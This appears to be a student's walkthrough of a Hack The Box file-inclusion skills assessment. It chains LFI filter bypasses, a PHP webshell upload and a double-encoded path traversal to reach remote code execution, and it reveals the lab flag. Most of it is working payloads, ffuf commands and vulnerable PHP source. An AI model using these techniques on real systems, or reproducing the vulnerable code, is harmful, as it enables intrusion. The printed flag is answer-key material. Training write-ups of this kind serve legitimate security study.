---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# Skills Assessment - File Inclusion

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.

### inspect all the pages and functions

- found CV upload format with file upload
  - FUZZ the path for upload
    - ffuf -w /usr/share/wordlists/dirb/common.txt -u 'http://154.57.164.71:31431/FUZZ' -fs 3405
      - uploads
        - 403 Forbidden
      - api
- the form send parameter ?n=username
  - try php wrappers
    - didnt work
  - this parameter didnt execute whatsoever only return the input as text
- found in response
  - <img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c"
### Fuzz the p parameter in api

- ffuf -u http://154.57.164.66:31311/api/image.php?p=FUZZ -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mr root
  - ....//....//....//....//....//etc/passwd
### Poisong the Logs

- GET /api/image.php?p=....//....//....//....//....//var/log/nginx/access.log&cmd=id  
  User-Agent: <?<!-- -->php system($_GET['cmd']); ?>
  - no execution
- using intercepting on & URL encode payload in User-Agent
  - The image "http://154.57.164.66:32507/api/image.php?p=....//....//....//....//....//var/log/nginx/access.log&cmd=id" cannot be displayed because it contains errors.
### Fuzz for webroot

- ffuf -u http://154.57.164.66:31311/api/image.php?p=....//....//....//....//....//FUZZ/index.php -w webroot.txt  -fs 0
  - Nothing
- Intruder
  - GET /api/image.php?p=....//....//....//....//....//§a§/index.php
    - var/www/html/
### Read the content of the files

- the php function handle the application for resume
  - /api/application.php
    - $ext = end((explode(".", $file_name)));  
      $target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
  - api/image.php
    - <?<!-- -->php  
      if (isset($_GET["p"])) {  
      $path = "../images/" . str_replace("../", "", $_GET["p"]);  
      $contents = file_get_contents($path);  
      header("Content-Type: image/jpeg");  
      echo $contents;  
      }  
      ?>
  - api/application.php
    - <?<!-- -->php  
      $firstName = $_POST["firstName"];  
      $lastName = $_POST["lastName"];  
      $email = $_POST["email"];  
      $notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;  

      $tmp_name = $_FILES["file"]["tmp_name"];  
      $file_name = $_FILES["file"]["name"];  
      $ext = end((explode(".", $file_name)));  
      $target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;  
      move_uploaded_file($tmp_name, $target_file);  

      header("Location: /thanks.php?n=" . urlencode($firstName));  
      ?>
### prepare webshell

- echo 'GIF8<?<!-- -->php system($_GET["cmd"]); ?>' > shell.gif
  - uploaded it as shell.gif
  - cat shell.gif | md5sum
    - 3f8685106a8b7bdcfdd77d8067845cdc
      - ....//....//....//....//....//var/www/html/uploads/3f8685106a8b7bdcfdd77d8067845cdc.gif&cmd=id
        - GIF8<?<!-- -->php system($_GET["cmd"]); ?>
          - our file didnt executed
### try diffrent path that execute PHP

- Fuzz with fuff
  - contact.php
    - read the source code
      - ....//....//....//....//....//var/www/html/contact.php
        - /contact.php
          - source code
            - <html>  
              <head>  
              <title>&lt;sumace/></title>  
              <link rel="stylesheet" href="https://unpkg.com/mvp.css">  
              <link rel="stylesheet" href="/css/custom.css">  
              </head>  
              <body>  
              <header>  
              <nav>  
              <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="30"/></a>  
              <ul>  
              <li><a href="/">Home</a></li>  
              <li>Contact</li>  
              <li><a href="/apply.php">Apply</a></li>  
              </ul>  
              </nav>  
              <section>  
              <header>  
              <h1>Contact us.</h1>  
              <p>Give us a call. <mark>We will sort it out</mark>.</p>  
              </header>  
              <p>  
              <?<!-- -->php  
              $region = "AT";  
              $danger = false;  

              if (isset($_GET["region"])) {  
              if (str_contains($_GET["region"], ".") || str_contains($_GET["region"], "/")) {  
              echo "'region' parameter contains invalid character(s)";  
              $danger = true;  
              } else {  
              $region = urldecode($_GET["region"]);  
              }  
              }  

              if (!$danger) {  
              include "./regions/" . $region . ".php";  
              }  
              ?>  
              </p>  
              </section>  
              </header>  
              <footer>  
              <hr>  
              <p>  
              <a href="/"><img src="/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c" height="25"/></a>  

              Sumace Consulting Gmbh  

              Rasumofskygasse 23/25, 1030 Wien  

              +43 670 8872 958  

              </p>  
              </footer>  
              </body>  
              </html>
          - we found parameter called region and include function we should be able to execute it
            - it escape the dot and slash (. /)
- prepare normal webshell
  - echo '<?<!-- -->php system($_GET["cmd"]); ?>' > shell.php
    - upload it
    - md5sum shell.php
      - fc023fcacb27a7ad72d605c4e300b389
- read the content of shell.php by using double encode URL
  - GET /contact.php?region=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=id
    - uid=33(www-data) gid=33(www-data) groups=33(www-data)
      - GET /contact.php?region=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar%252fwww%252fhtml%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389&cmd=cat+/flag_09ebca.txt
        - eedbb78d4800aa45573840ed6bd2d1e3
